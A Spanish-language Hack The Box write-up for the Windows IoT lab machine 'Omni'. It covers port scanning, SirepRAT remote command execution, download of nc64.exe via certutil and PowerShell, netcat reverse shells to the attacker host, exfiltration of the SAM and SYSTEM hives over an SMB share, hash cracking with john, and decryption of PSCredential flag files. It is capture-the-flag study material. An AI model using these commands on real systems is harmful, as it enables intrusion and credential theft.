---
layout: post
title: HTB_Omni
date: 2023/07/10
slug: HTB_Omni
heroImage: /assets/machines.jpg
---

# Omni {-}

## Introduccion {-}

La maquina del dia se llama Omni.

El replay del live se puede ver aqui

[![S4vitaar Omni maquina](https://img.youtube.com/vi/N9GVMEW62Qg/0.jpg)](https://www.youtube.com/watch?v=N9GVMEW62Qg)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.204
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.204
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.204 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p135,5985,8080,29817,29819,29820 10.10.10.204 -oN targeted
```


| Puerto | Servicio | Que se nos occure?             | Que falta?   |
| ------ | -------- | ------------------------------ | ------------ |
| 135    | msrpc    | rpcclient con nul session      |              |
| 5985   | WinRM    | evil-winrm                     | credenciales |
| 8080   | http     | Web Fuzzing                    |              |
| 29817  | msrpc    | Puertos por defecto de windows |              |
| 29819  | msrpc    | Puertos por defecto de windows |              |
| 29820  | msrpc    | Puertos por defecto de windows |              |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.204:8080
```

Es un Windows Device Portal con un HTTPapi y un WWW-Athentication.

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.204:8080 
```
, Vemos un panel basic authentication.


#### Checkeando la cavezera con curl {-}

```bash
curl -s -X GET "http://10.10.10.204:8080"
curl -s -X GET "http://10.10.10.204:8080" -I
```

Vemos en la cabezera que el basic-auth es sobre un 
```bash
 Windows Device Portal 
```

Buscamos si existe una vulnerabilidad asociada en google poniendo 
```bash
 Windows Device Portal github exploit 
```
 y encontramos
una pagina interesante de [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT) que nos permitiria ejecutar RCE.
## Vulnerability Assessment {-}

### Windows Device Portal {-}

```bash
git clone https://github.com/SafeBreach-Labs/SirepRAT
cd SirepRAT
python3 setup.py install
pip install -r requirements.txt

python3 SirepRAT.py
```

Intentamos leer un archivo de la maquina victima

```bash
python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
```

Aqui vemos que podemos leer archivos del systema. Intentamos ejecutar comandos.

Nos ponemos en escucha por trasa ICMP

```bash
tcpdump -i tun0 icmp -n
```

y ejecutamos el comando

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args " /c ping 10.10.14.8" --v
```

Aqui vemos que recibimos la traza y que tenemos capacidad de ejecucion remota de comando.
## Vuln exploit & Gaining Access {-}

### Ganando accesso con SirepRAT {-}

1. Descargamos nc64

    ```bash
    wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
    ```

1. Creamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Intentamos descargar el binario desde la maquina victima

    ```bash
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c certutil.exe -f -urlcache -split http://10.10.14.8/nc64.exe C:\Windows\Temp\nc64.exe" --v
    ```

Aqui vemos que no a pasado nada y que no hemos recibido ningun GET a nuestro servidor python.

Miramos si funcciona usando un directorio [applocker](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c certutil.exe -f -urlcache -split http://10.10.14.8/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe" --v
```

No funcciona. Intentamos con Powershell

```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "powershell" --args " /c iwr -uri http://10.10.14.8/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe" --v
```

Ahora si. Intentamos entablarnos una reverseshell.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos la shell

    ```bash
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443" --v
    ```

Ya estamos a dentre de la maquina victima.

```bash
whoami
#Output
'whoami' is not recognized as an internal or external command.

echo %USERNAME%
#Output
Omni
```

Como no hay directorio de usuarios en la maquina buscamos recursivamente por un fichero llamado 
```bash
 user.txt 
```


```bash
dir /r /s user.txt
cd C:\Data\Users\app
type user.txt
```

Aqui vemos quel fichero esta de typo 
```bash
 System.Management.Automation.PSCredential 
```
 que significa que esta cifrado. Intentamos leerlo con
el comando 
```bash
 (Import-CliXml -Path user.txt) 
```
 pero no nos deja. Miramos los derechos de este fichero con 
```bash
 icacls user.txt 
```
 y vemos quel usuario
app tiene los derechos full para este fichero. Esto significa que nos tenemos que convertir en el usuario **app**. 


### User Pivoting {-}


Lo raro aqui es que si hacemos 
un 
```bash
 net user 
```
, no vemos que existe el usuario **omni** y esto es turbio porque tambien podria decir que somos un usuario privilegiado.

Si creamos una carpeta en 
```bash
 C:\Data\Users 
```
 vemos que podemos crearla sin problema. Intentamos ver si podemos recuperar cosas como **sam**.

```bash
cd C:\Data\Users
mkdir Temp
cd Temp
reg save HKLM\system system.backup
reg save HKLM\sam sam.backup
```

Nos transferimos los ficheros creando un recurso compartido a nivel de red.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
```

Desde la maquina victima, nos creamos una unidad logica, la qual se conecta a nuestro recurso compartido

```bash
net use x: \\10.10.14.8\smbFolder /user:s4vitar s4vitar123
dir x:\
dir C:\Temp
copy sam.backup x:\sam
copy system.backup x:\system
```

#### Crackeando los hashes NT con John {-}

Ahora intentamos dumpear los hashes de los usuarios con **secretsdump**.

```bash
secretsdump.py -sam sam -system system LOCAL
```

Hemos podido obtener los hashes NT de los usuarios del systema. Los copiamos y los metemos en un fichero llamado hashes.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=NT
```

Aqui hemos podido crackear el hash del usuario **app**

#### Creando una reverseshell desde Windows Device Portal {-}

Nos connectamos al portal de la web a la url 
```bash
 http://10.10.10.204:8080 
```
. Aqui buscamos manera de ejecutar comandos como en Cualquier gestor
de contenido o panel de administracion. Y encontramos en el menu Processes un link llamado **Run command**.

Probamos con 
```bash
 echo %USERNAME% 
```
 y ejecuta el comando como el usuario app. Creamos un reverseshell.

1. Nos ponemos en escuchar por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el ncat previamente uploadeado en el systema

    ```bash
    C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443
    ```

Ya somos el usuario app y intentamos ejecutar la operacion cryptografica para leer la flag.

```bash
cd C:\Data\app
powershell
(Import-CliXml -Path user.txt)
(Import-CliXml -Path user.txt).GetNetworkCredential()
(Import-CliXml -Path user.txt).GetNetworkCredential().password
```

Ya tenemos la flag.

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
dir
```

Aqui vemos un fichero un poco raro llamado iot-admin.xml y el contenido tambien es un secret string.

```bash
(Import-CliXml -Path iot-admin.xml).GetNetworkCredential().password
```

Ya vemos un password para el usuario admin. Intentamos connectar al Windows Device Portal con el usuario administrator y
podemos connectarnos. Esto significa que vamos a hacer lo mismo que con el usuario app.

1. Nos ponemos en escuchar por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el ncat previamente uploadeado en el systema

    ```bash
    C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443
    ```

Ya somos el usuario Administrator y intentamos ejecutar la operacion cryptografica para leer la flag.

```bash
cd C:\Data\administrator
powershell
(Import-CliXml -Path root.txt)
(Import-CliXml -Path root.txt).GetNetworkCredential()
(Import-CliXml -Path user.txt).GetNetworkCredential().password
```

Ya tenemos la flag del usuario Administrator.


